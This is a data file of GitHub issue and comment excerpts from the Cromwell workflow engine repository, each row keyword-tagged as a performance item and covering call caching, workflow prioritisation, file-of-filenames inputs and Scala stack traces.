Performance,"As a **workflow runner**, I want **certain parameters to be ignored in the hashing process**, so that I can **call cache on more workflows when the result is exactly the same**.; - Effort: **?**; - Risk: **Medium** ; - We should err on the side of hashing a workflow differently if we are not absolutely confident that the parameter does not impact the result.; - Which parameters are ignored is NOT user-editable. This is to prevent users from accidentally ignoring parameters that do impact the result.; - Business value: **Medium**. Some parameters, such as `preemptible_attempts` and `CPU`, don't affect the outcome of the workflow but workflows with different CPU values will not call cache. @LeeTL1220 and @geoffjentry to provide additional thoughts and context if helpful.; Related issue #1210",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604:115,cache,cache,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604,2,['cache'],['cache']
Performance,"As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **?**. @LeeTL1220 to help with this. @geoffjentry thoughts on the following?; - Effort: **TBD**; - Risk: **TBD**; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023:78,cache,cache,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023,2,['cache'],['cache']
Performance,"As a **workflow runner**, I want **to selectively invalidate a workflow so that Cromwell does not use it for a cache-hit**, so that I can **not use bad or old workflow results in my new workflows**.; - Effort: **Medium**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116:111,cache,cache-hit,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116,1,['cache'],['cache-hit']
Performance,"As a high volume production user, I'm glad that Cromwell now has a decoupled mechanism for submitting workflows versus running them. I often will submit more workflows than my server or google quotas can handle and so I keep the maximum running workflows set to a smaller number of workflows than I submit. Previously I would have to keep my own queue and dribble workflows into Cromwell to get the same effect. However, one thing I have lost is the ability to prioritize those workflows! I need to be able to prioritize those submitted workflows that have not started running. This feature has several components:; - ability to specify a priority (integer) when submitting a workflow; - ability to set a priority for a submitted workflow (ok to not check it's status) [new REST endpoint to PATCH a workflow]; - change the query for the polling mechanism that picks up workflows to sort by descending priority (e.g. 1 is highest priority) when selecting workflows. While users can change the priority of a running workflow, this has no effect. It is the priority to start a workflow.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566:346,queue,queue,346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566,1,['queue'],['queue']
Performance,"As a pipeline author, I don't enjoy having to spin up a VM, with docker in order to do string substitutions on my parameters. In the GOTC pipeline, we do this in order to strip off the extension of the input file in order to get a base-name, which happens ~40 times in a 20-plex workflow. . This causes a real problem because by requiring so many VMs to spun up, we spend more money (although that cost is quite small) but also eat into our quotas and QPS limits, which actually does hurt our scalability. The proposal is to add a new expression language function which allows for regex substitutions:. sub(string, pattern, replacement). For example,. to strip off an extension from a file you could use `sub(filename, "".bam$"","""")`; to swap an extension, you could use `sub(filename, "".bam$"", "".metrics"")`. By being constrained to a regex (unlike an arbitrary code block) we don't have concerns about security or evaluating these in the cromwell engine. This does not eliminate the need for a generally more expressive expression language or user defined functions, but does solve a large class of common usages that impact ease of use and performance",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/597:493,scalab,scalability,493,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/597,2,"['perform', 'scalab']","['performance', 'scalability']"
Performance,"As a pipeline author, sometimes I have pipelines which require lots of input files. For example, the joint calling pipeline at one point has a step where I need to combine genotypes from all the samples. This can be in the 10,000s range and growing. Currently, this causes lots of problems. In Cromwell having that many inputs causes memory and database problems because parameters are first class citizens and there are so many of them. In addition they are file paths which can be very long. This can lead to GBs of footprint. Similarly this causes problem for the underlying backend (e.g. JES) because of the volume. Recently our requests to JES were truncated because a load-balancer in front of the service had a maximum request size. I would like to be able to instead specify a file, which is full of file names. My task will know what to do with this. I need a way to indicate this in wdl (perhaps a new type, like FOFN instead of File?). With this information, the Cromwell backend can do the correct thing during localization. For example in JES, we would tell the JES Api this is a FOFN. . Each backend would then need to handle this type. When receiving a FOFN input type the backend would first localize the FOFN and then iterate through the contents to localize each file. A new FOFN would then be rewritten to reference the local paths, and that FOFN would be used in place of the original FOFN as parameters to the tasks. . First, we should conduct a feasibility effort on this with a thought experiment on the joint calling workflow to see if FOFNs would solve the parameter space problem ( #1059 )",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058:674,load,load-balancer,674,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058,1,['load'],['load-balancer']
Performance,"As a user of the cromwell REST services, I would like to be able to get:; - the size of the current total output of the workflow; - the size after cleaning up intermediate results; - outputs retained due to their reference in a call cached execution",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/602:233,cache,cached,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/602,1,['cache'],['cached']
Performance,"As a user with a controlled file system (like GOTC or the cromwell execution directory) where the I know that a file path is immutable and uniquely identifying, I would like to run the cromwell server in a mode where the file path can be used in call caching rather than computing the actual hash. I will take on the risk that if I break that contract (by modifying files), workflows will not execute properly. I want to do this because it will be a big performance gain when I have many files and I know that their paths are unique. @cjllanwarne gets credit for raising this as a cool feature, @jsotobroad and @dshiga agreed",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1271:454,perform,performance,454,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1271,2,['perform'],['performance']
Performance,"As a user, I have a workflow that runs a scatter over 10 shards with a task that produce a file, then uses writelines to write out the gathered array of files (the fofn), which is used as an input to a downstream step. That downstream step will never call cache because the fofn is different every time because the file in it, while each having the same md5, produce a different fofn because call caching copies the data to new paths on each cache hit. This is painful because I love call caching, and now I have to recompute this step (and all steps downstream of it) every time. @cjllanwarne @jmthibault79 any more details or ideas for addressing this; @katevoss this is the issue we talked about on the phone yesterday. It's slowing down JG, but depending on how hard it is to fix may be too late for this use case",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309:256,cache,cache,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309,2,['cache'],['cache']
Performance,"As a user, I would like to be able to disable the metadata summary refresh. I want to do this because I'd like to be able to stand up a ""read only"" cromwell that that doesn't write to the database because I can use these to scale out horizontally for read api operations (e.g. status, metadata). Scaling out these operations is important because it allows my cromwell to remain responsive even under heavy read load. @geoffjentry -- pls expand/correct",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378:411,load,load,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378,1,['load'],['load']
Performance,"As an alternative I'd suggest something running *outside* the docker container (e.g. polling ""docker stats"" outside the container). I don't now enough to know if it's technically feasible, but I think it would be ideal as an always-on stats provider. There are two main reasons why:; 1) Linux memory usage is complex enough that it's easy to get this wrong. I started with the script provided above, but on many systems it gives the wrong answer because linux aggressively caches things in memory, and you therefore ""used"" - ""buffers"" - ""cached"" is a much better approximation of the memory that's tied up. Here's a plot showing these two estimates vs output from docker stats:; ![image](https://user-images.githubusercontent.com/6463752/48026456-228c0f80-e114-11e8-9240-e5e7b1c3cb23.png). 2) Seemingly every new linux distro changes the output format and calculations of free and df. The number of rows and columns change, requiring complex gymnastics with awk to extract the required values and do the math. And some docker images don't come with free or df at all. This is a problem for me because I'm optimizing WDLs but it's not always easy to change the dockers they're running in (I'm guessing I'm not totally unique in this). Difficulties like this led me to develop a variant of the script that uses /proc for cpu and memory info. I've inlined it below:; ```; #!/bin/bash; set -Eeuo pipefail. MONITOR_MOUNT_POINT=${MONITOR_MOUNT_POINT:-""/cromwell_root""}; SLEEP_TIME=${SLEEP_TIME:-""10""}. function getCpuUsage() {; # get cpu info just by grep-ing from /proc/stat. Use awk to convert to %; grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {printf ""%.1f%%"", usage}'; }. function getMem() {; # get desired memory value from /proc/meminfo, in GiB, and also; # as a percentage of total; # argument is the label of the desired memory value; cat /proc/meminfo \; | awk -v MEM_FIELD=""$1"" '{; f[substr($1, 1, length($1)-1)] = $2; } END {; printf ""%.2f GiB"", f[MEM_FIELD] / 1048576; }' ; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027:473,cache,caches,473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027,2,['cache'],"['cached', 'caches']"
Performance,"As discussed in https://github.com/broadinstitute/cromwell/issues/6235, developers of workflows for GCP who store their images in Google Container Repositories can be exposed to large Google GCS egress charges when users attempt to run workflows in different continental regions, resulting in many trans-continental container pulls. There currently does not seem to be a satisfactory way to guard against this:. - We can't make our image repositories private because we want to make the workflows available to the public via Terra.; - We can't make the repositories requester-pays because the pipelines API does not support pulling images from requester-pays repositories.; - We can mirror our repositories to different regions, but we are still dependent on our users to configure their workflows to point to the right region and take good-faith extra steps to help us avoid these charges. Some possible ideas were suggested by @freeseek in https://github.com/broadinstitute/cromwell/issues/6235:. - Convince Google to support requester-pays buckets for container pulls in PAPI.; - Modify some combination of Cromwell/PAPI to cache images rather than pulling them for each task that is run.; - Develop infrastructure within Cromwell to know what region the workflow is running in and automatically select the right GCR mirror to pull from.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442:1127,cache,cache,1127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442,1,['cache'],['cache']
Performance,As for; ```; PAPI error code 7. Required 'compute.zones.list' permission for 'projects/xxx'; ```; it sounds like you need to access Google Cloud Console and enable this permission for your project (Cromwell cannot perform this step for you automatically),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872:214,perform,perform,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665240872,1,['perform'],['perform']
Performance,"As per a convo with @mcovarr I'm going to switch out the mutable map for an immutable list structure. It'll be less performant but a lot cleaner, and it'd be easy to switch out if performance every did become an issue here. To paraphrase Miguel, something else likely will have blown up in Cromwell prior to performance being an issue here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230829446:116,perform,performant,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230829446,3,['perform'],"['performance', 'performant']"
Performance,Assuming the 0% coverage is an artifact of this class being loaded through reflection or something?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3455#issuecomment-376360340:60,load,loaded,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3455#issuecomment-376360340,1,['load'],['loaded']
Performance,"AsyncBackendJobExecutionActor (ABJEA) uses a `completionPromise: Promise` to tell its parent actor, the BackendJobExecutionActor (BJEA), when the async job is done. I doesn't seem obvious why we're passing around references to `scala.concurrent.Promise`s when akka has a perfectly good message system already. Worst case, if one needed two different states and didn't want the framework to use an FSM, the BJEA could `context.become(initializing)`, start the async job, then `context.become(asyncRunning)`, and wait for the message from the ABJEA.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1218:234,concurren,concurrent,234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1218,1,['concurren'],['concurrent']
Performance,"AsyncBackendJobExecutionActor [UUID(af282f7a)wf_hello.hello:NA:1]: Job bccmdfdd6o377kru9q6g is complete; 2018-06-07 13:13:04,883 cromwell-system-akka.dispatchers.backend-dispatcher-183 INFO - TesAsyncBackendJobExecutionActor [UUID(af282f7a)wf_hello.hello:NA:1]: Status change from Running to Complete; 2018-06-07 13:13:06,346 cromwell-system-akka.dispatchers.engine-dispatcher-59 ERROR - WorkflowManagerActor Workflow af282f7a-1e95-4390-8cf7-c3bbd93b10b2 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.nio.file.NoSuchFileException: /Users/tdyar/workspace/cromwell/cromwell-executions/wf_hello/af282f7a-1e95-4390-8cf7-c3bbd93b10b2/call-hello/execution/rc; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.ru",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743:7010,concurren,concurrent,7010,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743,1,['concurren'],['concurrent']
Performance,AsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:397); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionResult(JesAsyncBackendJobExecutionActor.scala:46); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:326); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handlePollSuccess(JesAsyncBackendJobExecutionActor.scala:46); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:291); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:290); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1923:2938,concurren,concurrent,2938,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1923,1,['concurren'],['concurrent']
Performance,At this moment there is a way to submit jobs to a HPC with a command line that is executed. With drmaa this is also possible. The only problem is that with drmaa v1 you can only get status of jobs submitted in the same session. This means for recovering after a restart you must rely on command line methods like in the current implementation. Drmaa v2 have the possibility to track jobs outside it's session but there is almost no support for v2 yet. Here is the implementation inside queue:; https://github.com/broadgsa/gatk/tree/master/public/gatk-queue/src/main/scala/org/broadinstitute/gatk/queue/engine/drmaa,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1355:486,queue,queue,486,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1355,3,['queue'],['queue']
Performance,Attempting to load a WDL containing imports fails the wrong way if you don't supply any import resolvers,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2701:14,load,load,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2701,1,['load'],['load']
Performance,Avoid ConfigFactory.load all over the place,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796:20,load,load,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796,1,['load'],['load']
Performance,BC4Connection.java:47); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:389); 	at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:95); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:101); 	at com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:341); 	at com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:193); 	at com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:430); 	at com.zaxxer.hikari.pool.HikariPool.access$500(HikariPool.java:64); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:570); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:563); 	at java.util.concurrent.FutureTask.run(FutureTask.java:266); 	... 3 more; Caused by: java.net.ConnectException: Connection refused; 	at java.net.PlainSocketImpl.socketConnect(Native Method); 	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350); 	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206); 	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188); 	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392); 	at java.net.Socket.connect(Socket.java:589); 	at com.mysql.jdbc.StandardSocketFactory.connect(StandardSocketFactory.java:211); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:300); 	... 24 more; ```; How can I properly configure the database to work properly in the local command? Thank you!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:6135,concurren,concurrent,6135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['concurren'],['concurrent']
Performance,BCS Call caching optimization [BA-5965],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5148:17,optimiz,optimization,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5148,1,['optimiz'],['optimization']
Performance,BT-271 Do not cache to calls that are successes by Cromwell standards but failures by Centaur standards.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6335:14,cache,cache,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6335,1,['cache'],['cache']
Performance,"BTW, I changed the config above because the only viable way to implement a lock in singularity is one lock per cache. If two images that are different but with shared layers are written to the cache, it can still become corrupted!. @TMiguelT This will be hard to pull of in the code because the runtime attributes are evaluated just before task submissions (not before scattering). Also there will still be race conditions. Only one process should pull to the same cache at the same time. This is because images have shared layers. Also this requires additional code and is only applicable to the singularity use case. The few lines in the script are way way way less than any code that would be required to make this happen. As regards tot he messy bash, no bash is required. Flock + the pull command is just one line. The only bash that is required is to set a few variables, but that is not really scripting. Flock is a great solution. Thanks a lot for suggesting it! The only better solution would have been that singularity has implemented such a filelock itself. As long as the pull process happens on the same node, the kernel will ensure that there are no race conditions. Of course this doesn't work on another node, so the flock command should be placed before the submit command.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627835781:111,cache,cache,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627835781,5,"['cache', 'race condition']","['cache', 'race conditions']"
Performance,Backend Store performing recovery closes #751,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1241:14,perform,performing,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1241,1,['perform'],['performing']
Performance,"Backend.scala:573); at cromwell.util.TryUtil$$anonfun$5.apply(TryUtil.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:79); at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:123); at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:573); at cromwell.engine.backend.jes.JesBackend$$anonfun$35.apply(JesBackend.scala:707); at cromwell.engine.backend.jes.JesBackend$$anonfun$35.apply(JesBackend.scala:706); at scala.util.Success.flatMap(Try.scala:231); at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:706); at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:362); at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:350); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-04-28 15:35:51,730] [warn] JesBackend [1cb9c1d2:jes_task]: Exception occurred while creating JES Run. Retrying in 4742 (9 more retries)...; ```. I've walked through the stacktrace and can't see anything obviously wrong with the JesAttachedDisk.scala code, which is just running an md5sum on the params of the disk, so that should always result in a string of characters that is legal to use for a disk name, according to the provided link. I h",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/757:5224,concurren,concurrent,5224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/757,1,['concurren'],['concurrent']
Performance,"BackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:7117,concurren,concurrent,7117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,BackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:1919,concurren,concurrent,1919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,2,['concurren'],['concurrent']
